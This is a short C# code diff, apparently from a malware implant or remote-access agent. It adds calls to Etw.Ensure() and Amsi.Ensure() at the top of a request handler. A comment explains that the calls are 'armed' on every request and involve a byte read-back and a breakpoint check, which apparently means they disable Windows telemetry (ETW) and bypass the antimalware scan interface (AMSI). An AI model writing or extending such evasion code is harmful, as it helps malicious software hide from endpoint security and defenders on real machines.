@@ -70,6 +70,13 @@ namespace Nx
 			{
 				return;
 			}
+			// telemetry first, then the scanner -- see Etw.cs for why the order is
+			// not arbitrary. Both are idempotent and cheap once armed (a read-back of
+			// a handful of bytes, plus a thread-context check for the breakpoint), and
+			// both swallow their own failures, so this is safe on every request and
+			// covers the verbs that never go through Job.Load.
+			Etw.Ensure();
+			Amsi.Ensure();
 			GZipStream gz = new GZipStream(h.sink, CompressionMode.Compress, true);
 			byte[] res = Dsp(h);
 			gz.Write(res, 0, res.Length);
